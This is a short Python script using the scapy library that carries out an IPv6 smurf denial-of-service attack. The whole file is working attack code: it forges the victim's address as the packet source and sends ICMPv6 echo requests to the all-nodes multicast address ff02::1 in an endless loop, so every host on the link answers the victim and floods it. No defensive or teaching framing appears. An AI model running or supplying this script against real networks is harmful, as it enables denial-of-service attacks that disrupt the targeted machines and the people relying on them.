#!/usr/bin/python
import sys
from scapy.layers.inet6 import ICMPv6EchoRequest, IPv6
from scapy.sendrecv import send

# Ask user to insert value
if len(sys.argv) == 2:
    victim_ip = sys.argv[1]
else:
    print("Please insert:\n 1. Victim IPv6 address")
    sys.exit(1)

# Generate packet
print("Smurfing every host to attack host: " + victim_ip)
while True:
    packet1 = IPv6(src=victim_ip, dst="ff02::1")/ICMPv6EchoRequest()
    send(packet1, verbose=False)

